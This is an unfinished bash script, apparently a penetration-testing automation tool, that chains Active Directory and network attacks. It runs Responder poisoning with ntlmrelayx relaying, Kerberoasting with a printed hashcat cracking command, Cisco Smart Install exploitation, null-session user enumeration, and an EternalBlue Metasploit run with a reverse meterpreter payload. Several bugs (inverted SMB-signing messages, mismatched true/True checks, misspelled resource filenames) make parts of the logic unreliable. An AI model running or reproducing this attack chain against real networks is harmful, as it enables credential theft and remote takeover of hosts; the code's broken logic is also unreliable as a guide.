#!/bin/bash
### To do marked with ***

# Colors make this more l33t
ERROR='\033[0;31m[-]\033[0m'
UPDATE='\033[1;33m$UPDATE\033[0m'
SUCCESS='\033[0;32m$SUCCESS\033[0m]'

function smbRelay() {
    # Checks if LLMNR and/or NBT-NS are enabled on the network. Then scans hosts
    # for open TCP/445 and uses CME's gen-relay-list to get a list of targets.
    SMBRELAYPROTOS=false # Setup vars to use in final comparison
    SMBRELAYMESSAGESIGNING=false
    echo "How long do you want to wait for LLMNR/NBT-NS traffic (seconds)?" # I'd recommend waiting at least 180 seconds (3mins)
    read -p "Seconds: " DURATION # Ideally I'd watch Responder's output for a request to come through, but this will do for now
    echo -e "$UPDATE Checking for LLMNR & NBT-NS. I'll be back in $DURATION seconds..."
    (python /opt/Responder/Responder.py -I eth0 -A &) &> /dev/null # Spawn Responder in analyze mode and mute output
    sleep $DURATION
    pkill -f "Responder" &> /dev/null # Kill the Responder process after N seconds
    if grep "[Analyze mode: LLMNR]" /opt/Responder/logs/Analyzer-Session.log &> /dev/null; then # Parse the Analyzer session logs for any poisoned traffic
        echo -e "$UPDATE Found LLMNR!"
        SMBRELAYPROTOS=true
    elif grep "[*]  [NBT-NS]" /opt/Responder/logs/Analyzer-Session.log &> /dev/null; then
        echo -e "$UPDATE Found NBT-NS!"
        SMBRELAYPROTOS=true
    else
        echo -e "$ERROR Broadcast protocols not found in the timeframe specified :( Maybe try capturing a little longer?"
        read -p "Would you still like to check for hosts with SMB message signing disabled (y/n)?" CHOICE
        case "$CHOICE" in
          y|Y )  echo -e "$UPDATE Checking for hosts with SMB message signing disabled"
                 if [ ! -f open445.txt ]; then
                   echo -e "$UPDATE Using masscan to check for open port 445..."
                   masscan -p445 -iL $1 -oG open445.txt # Massscan over Nmap here in case larget subnets are used
                   grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
                 else
                   echo -e "$UPDATE Found file of hosts with port 445 open!"
                 fi
                 cme smb open445.txt --gen-relay-list SmbSigningDisabled.txt # Use CME to check for SMB signing
                 if [[ $(wc -l <SmbSigningDisabled.txt) -gt 0 ]]; then
                   echo -e "$UPDATE SMB signing is enabled!";
                   SMBRELAYMESSAGESIGNING=true
                 else
                   echo -e "$ERROR SMB signing is disabled :("
                 fi
                 # Final check
                 if [ "$SMBRELAYPROTOS" == "True" ]; then
                     if [ "$SMBRELAYMESSAGESIGNING" == "True" ]; then
                         echo -e "$SUCCESS SMB relaying looks like a valid vector! Let's do it!"
                     else
                         echo -e "$ERROR LLMNR/NBT-NS is present, but we couldn't find hosts to relay to :("
                     fi
                 else
                     echo -e "$ERROR LLMNR and NBT-NS weren't detected and we couldn't find hosts with SMB signing disabled :("
                 fi
                 ;;
          n|N ) echo -e "$ERROR Exiting..."
                exit 1;;
          * ) echo -e "$ERROR Please choose 'y' or 'n'";;
        esac
    fi
    #*** Called this same function in the earlier logic. Can I just make this its own function?
    if [ ! -f open445.txt ]; then
      echo -e "$UPDATE Using masscan to check for open port 445..."
      masscan -p445 -iL $1 -oG open445.txt # Massscan over Nmap here in case larget subnets are used
      grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
    else
      echo -e "$UPDATE Found file of hosts with port 445 open!"
    fi
    cme smb open445.txt --gen-relay-list SmbSigningDisabled.txt # Use CME to check for SMB signing
    if [[ $(wc -l <SmbSigningDisabled.txt) -gt 0 ]]; then
      echo -e "$UPDATE SMB signing is enabled!";
      SMBRELAYMESSAGESIGNING=true
    else
      echo -e "$ERROR SMB signing is disabled :("
    fi
    # Final check
    if [ "$SMBRELAYPROTOS" == "True" ]; then
        if [ "$SMBRELAYMESSAGESIGNING" == "True" ]; then
            echo -e "$SUCCESS SMB relaying looks like a valid vector! Let's do it!"
            if [[ $AUTOPWN = 'true' ]]; then #***
              echo -e "$UPDATE Autopwning..."
              tmux new -d -s responder 'python /opt/Responder/Responder.py -I eth0 -rf'
              tmux new -d -s ntlmrelayx 'python /opt/impacket/ntlmrelayx.py -tf SmbSigningDisabled.txt'
              echo -e "$SUCCESS Responder and ntlmrelayx started in tmux sessions:"
              tmux ls
            fi
        else
            echo -e "$ERROR LLMNR is present, but we couldn't find hosts to relay to :("
        fi
    else
        echo -e "$ERROR LLMNR and NBT-NS weren't detected :("
    fi
}

function kerberoast() {
  # Collects kerberos SPNs after getting information about the user to use
  echo -e "$UPDATE We'll need some information first:"
  echo -e "$UPDATE What is the name of the domain? (ex. ad.example.com):"
  read -p "Domain: " KERBDOMAIN
  echo -e "$UPDATE What domain user would you like to use? (ex. jdoe):"
  read -p "Username: " KERBUSER
  # After getting the username, we'll use GetUserSPNs' password prompt
  python /opt/impacket/examples/GetUserSPNs.py -dc-ip $KERBDOMAIN -request $KERBDOMAIN/$KERBUSER -outputfile kerberos-hashes.txt > kerberoast-output.tmp
  touch kerberos-hashes.txt # Hack just in case we didn't get anything back
  cat kerberoast-output.tmp | grep -v "Error" >> kerberoast-users.txt
  rm kerberoast-output.tmp
  if [[ $(wc -l <kerberos-hashes.txt) -gt 0 ]]; then
    echo -e "$SUCCESS Collected `wc -l <kerberos-hashes.txt` hashes and stored them in kerberos-hashes.txt for cracking!";
    echo -e "$SUCCESS Use 'hashcat -m 13100 -a 0 kerberos-hashes.txt wordlists/epic_list -r rules/d3ad0ne.rule -o $KERBDOMAIN.txt'";
    echo -e "$SUCCESS Users and roles are stored in kerberoast-users.txt";
  else
    echo -e "$ERROR No hashes recovered. Are you sure you endered the correct information and your creds are valid?"
  fi
}

function smartInstall() {
  # Checks for open port 4786 to use with SIET
  echo -e "$UPDATE Checking for open port 4786 in the range"
  nmap -p4786 -iL $1 -oG open4786.gnmap
  grep "Host:" open4786.gnmap | grep "4786/open/tcp" | awk '{print $2}' > open4786.txt
  if [[ $(wc -l <open4786.txt) -gt 0 ]]; then
    echo -e "$SUCCESS Found `wc -l <open4786.txt` hosts with port 4786 open!";
    echo -e "$UPDATE Checking if any have Smart Install enabled..."
    python /opt/SIET/siet.py -t -l open4786.txt > smartInstallEnabled.tmp
    #*** Need to parse test output and put into smartInstallEnabled.txt
    if [[ $(wc -l <smartInstallEnabled.txt) -gt 0 ]]; then
      echo -e "$SUCCESS Found `wc -l <smartInstallEnabled.txt` hosts with Smart Install enabled!"
        if [[ $AUTOPWN = 'true' ]]; then #***
          echo -e "$UPDATE Autopwning..."
          python /opt/SIET/siet.py -g -l smartInstallEnabled.txt
        fi
    fi
  else
    echo -e "$ERROR Didn't find any hosts with port 4786 open :("
  fi
}

function nullSessionEnum() {
  # Checks for user enumeration via null sessions on the domain controller
  echo -e "$UPDATE Trying to identify the domain name..."
  DOMAIN=$(grep "search" /etc/resolv.conf | awk '{print $2}') # Can also grep for "domain" but this has been more reliable
  if [ -z "$DOMAIN" ]; then
  	echo -e "$ERROR Could not automatically identify the domain name. Enter it below."
	  read -p "Domain: " DOMAIN
  elif [ "$DOMAIN" == "localdomain" ]; then
  	echo -e "$ERROR Domain identified as localdomain. Something is wrong (maybe you're in a NAT'd VM?). If you know the name of the domain, enter it below."
  	read -p "Domain: " DOMAIN
  else
  	echo -e "$UPDATE Domain identified as $DOMAIN"
  fi
  DOMAINCONTROLLERS=$(nslookup -type=srv _ldap._tcp.dc._msdcs.$DOMAIN | grep "_ldap" | awk '{print $7}' | sed 's/\.$//g')
  if [ -z "$DOMAINCONTROLLERS" ]; then
  	echo -e "$ERROR Could not find any domain controllers :("
  	exit 1
  else
  	echo -e "$SUCCESS Found $(echo "$DOMAINCONTROLLERS" | wc -l) domain controllers:"
  	echo "$DOMAINCONTROLLERS"
  fi
  echo -e "$UPDATE Checking if the domain controllers support null sessions"
  for dc in $DOMAINCONTROLLERS
  do
  	rpcclient -U "%" -W $DOMAIN -c enumdomusers $dc > $dc-nullSessionUsers.txt
  	OUTLEN=$(wc -l <$dc-nullSessionUsers.txt)
  	if [[ $OUTLEN -gt 0 ]]; then
  		echo -e "$SUCCESS Collected $OUTLEN users from $dc!"
  	else
  		echo -e "$ERROR No users collected from $dc :("
  	fi
  done
  echo -e "$UPDATE Deduplicating output..."
  cat *.$DOMAIN-nullSessionUsers.txt | sort | uniq > $DOMAIN-MASTER-nullSessionUsers.txt
  echo -e "$SUCCESS Collected $(wc -l <$DOMAIN-MASTER-nullSessionUsers.txt) unique users and stored them in $DOMAIN-MASTER-nullSessionUsers.txt"
  echo -e "$SUCCESS Happy hunting!"
}

function ms17-010() { #*** Need to confirm this actually works...
  if [ ! -f open445.txt ]; then
    echo -e "$UPDATE Using masscan to check for open port 445..."
    masscan -p445 -iL $1 -oG open445.txt # Masscan over Nmap here in case larget subnets are used
    grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
  else
    echo -e "$UPDATE Found file of hosts with port 445 open!"
  fi
  echo -e "$UPDATE Using nmap to check for vulnerable systems. This is going to take a little while..."
  nmap -Pn -p445 --script smb-vuln-ms17-010 -iL open445.txt -oA MS17-010-check
  echo -e "$SUCCESS Saved output to MS17-010-check.nmap"
  echo -e "$UPDATE Parsing nmap output for vulnerable systems"
  grep -B 7 VULNERABLE: MS17-010-check.nmap| grep "Nmap scan report for" | awk '{print $5}' > MS17-010-vulnhosts.lst #*** Assumed syntax. Need to confirm
  if [[ $(wc -l <MS17-010-vulnhosts.lst) -gt 0 ]]; then
    echo -e "$SUCCESS Found `wc -l <MS17-010-vulnhosts.lst` hosts vulnerable to MS17-010!";
    if [[ $AUTOPWN = 'true' ]]; then #***
      echo -e "$UPDATE Autopwning..."
      # Obviously you can change everything here.
      service postgresql start &&  msfdb init
      echo "use exploit/windows/smb/ms17_010_eternalblue" > ms17-010.rc
      echo "set RHOSTS file:./MS17-010-vulnhosts.lst" >> ms171-010.rc #*** Does this support RHOSTS yet?
      echo "set PAYLOAD windows/x64/meterpreter/reverse_https" >> ms17-010.rc
      echo "set LHOST eth0" >> ms17-010.rc
      echo "run" >> ms171-010.rc
      msfconsole -r ms171-010.rc
    fi
  else
    echo -e "$ERROR Didn't find any hosts vulnerable to MS17-010 :("
  fi
}

#function buildRange() {
     # We can probably build out our own scope using reverse DNS.
#    LOCALNET=ip route | grep "/" | awk '{print $1}' # Get local net from ip route
#    DOMAIN=`grep "search" /etc/resolv.conf | awk '{print $2}'` # Get domain from resolv.conf
#    #*** Add reverse DNS w/ dnsrecon/dnsenum
#    #*** Parse collected IPs, split to /24s, dedup, then store in a file
#}

#function smbMessageSigning() {
#  if [ ! -f open445.txt ]; then
#    echo -e "$UPDATE Using masscan to check for open port 445..."
#    masscan -p445 -iL $1 -oG open445.txt # Massscan over Nmap here in case larget subnets are used
#    grep "Host" open445.txt | awk '{print $2}' > open445.tmp && mv open445.tmp open445.txt # Parse out  IP addresses
#  else
#    echo -e "$UPDATE Found file of hosts with port 445 open!"
#  fi
#  cme smb open445.txt --gen-relay-list SmbSigningDisabled.txt # Use CME to check for SMB signing
#  if [[ $(wc -l <SmbSigningDisabled.txt) -gt 0 ]]; then
#    echo -e "$UPDATE SMB signing is enabled!";
#    SMBRELAYMESSAGESIGNING=true
#  else
#    echo -e "$ERROR SMB signing is disabled :("
#  fi
#}
